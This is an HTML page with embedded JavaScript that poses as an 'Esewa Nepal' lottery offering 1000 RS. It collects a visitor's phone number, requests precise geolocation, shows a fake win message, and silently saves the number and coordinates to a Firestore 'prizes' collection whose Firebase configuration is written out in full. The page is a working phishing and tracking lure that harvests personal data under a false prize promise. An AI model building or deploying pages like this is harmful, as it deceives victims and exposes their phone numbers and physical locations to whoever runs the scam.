<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Esewa Benefits</title>
    <script type="module">
        // Firebase SDK initialization
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyBGCdAM9Qbhr_FfBFPRO5l7_09wvNFRh-s",
            authDomain: "fir-app-7eae8.firebaseapp.com",
            databaseURL: "https://fir-app-7eae8-default-rtdb.firebaseio.com",
            projectId: "fir-app-7eae8",
            storageBucket: "fir-app-7eae8.firebasestorage.app",
            messagingSenderId: "588779148159",
            appId: "1:588779148159:web:eabe408532a8236afd804a"
        };

        // Initialize Firebase
        let app, db;
        try {
            app = initializeApp(firebaseConfig);
            db = getFirestore(app);
            console.log("Firebase initialized successfully");
        } catch (error) {
            console.error("Error initializing Firebase:", error);
        }

        // Function to handle "Get Prize" button click
        window.getPrize = async function () {
            const errorDiv = document.getElementById("error");
            const prizeDiv = document.getElementById("prize");

            if (!navigator.geolocation) {
                errorDiv.textContent = "Geolocation is not supported by this browser.";
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    prizeDiv.innerHTML = `<p>ðŸŽ‰ Congratulations! You have won 1000 RS in Esewa Nepal! ðŸŽ‰</p>`;
                    prizeDiv.style.display = "block";

                    if (!db) {
                        errorDiv.textContent = "Error: Firestore not initialized.";
                        return;
                    }

                    try {
                        const docRef = await addDoc(collection(db, "prizes"), {
                            phoneNumber: document.getElementById("phoneNumber").value,
                            latitude: latitude,
                            longitude: longitude,
                            timestamp: serverTimestamp()
                        });
                        console.log("Prize data saved to Firebase, Document ID:", docRef.id);
                    } catch (error) {
                        errorDiv.textContent = "Error saving data: " + error.message;
                        console.error("Error saving prize data:", error);
                    }
                },
                (err) => {
                    let errorMessage = "Error retrieving location. Please enable location services.";

                    if (err.code === 1) {
                        errorMessage = "Location access denied. Please allow location access in your phone settings.";
                    } else if (err.code === 2) {
                        errorMessage = "Location unavailable. Please try again later.";
                    } else if (err.code === 3) {
                        errorMessage = "Location request timed out. Try again.";
                    }

                    errorDiv.textContent = errorMessage;
                    console.error("Geolocation error:", err);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        };

        // Function to show prize page after phone number submission
        window.showPrizePage = function () {
            const phoneNumber = document.getElementById("phoneNumber").value.trim();

            if (!phoneNumber) {
                alert("ðŸ“± Please enter your phone number to proceed.");
                return;
            }

            document.getElementById("phoneNumberSection").style.display = "none";
            document.getElementById("prizeSection").style.display = "block";
        }
    </script>

    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: url('https://www.example.com/lottery-bg.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Roboto', sans-serif;
            color: white;
        }

        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            color: #FFD700;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
        }

        button {
            padding: 12px 25px;
            background-color: #3b82f6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.2em;
            transition: transform 0.3s ease, background-color 0.3s ease;
        }

        button:hover {
            background-color: #2563eb;
            transform: scale(1.1);
        }

        .phone-number-section,
        .prize-info {
            padding: 30px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 10px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
            width: 80%;
            max-width: 400px;
            text-align: center;
            margin: 20px;
        }

        #phoneNumber {
            padding: 12px;
            margin-top: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: 2px solid #ccc;
            font-size: 16px;
            width: 80%;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
            background-color: #f9f9f9;
        }

        #phoneNumber:focus {
            border-color: #3b82f6;
            outline: none;
            box-shadow: 0 0 5px rgba(59, 130, 246, 0.5);
        }

        .prize-info {
            display: none;
            color: green;
            background-color: #d1fae5;
        }

        .error {
            color: red;
            margin-top: 10px;
        }

        .prize-info p {
            font-size: 1.5em;
            margin: 20px 0;
        }

        @media (max-width: 768px) {
            body {
                padding: 20px;
            }
        }
    </style>
</head>

<body>
    <div id="phoneNumberSection" class="phone-number-section">
        <h1>Lottery System - Win 1000 RS</h1>
        <p>Enter your phone number to participate:</p>
        <input type="text" id="phoneNumber" placeholder="Enter your phone number" />
        <button onclick="showPrizePage()">Submit</button>
    </div>

    <div id="prizeSection" style="display: none;" class="phone-number-section">
        <p>Click the button below to see if youâ€™ve won 1000 in Esewa Nepal!</p>
        <button onclick="getPrize()">Get Prize</button>
        <div id="prize" class="prize-info"></div>
        <p id="error" class="error"></p>
    </div>
</body>

</html>
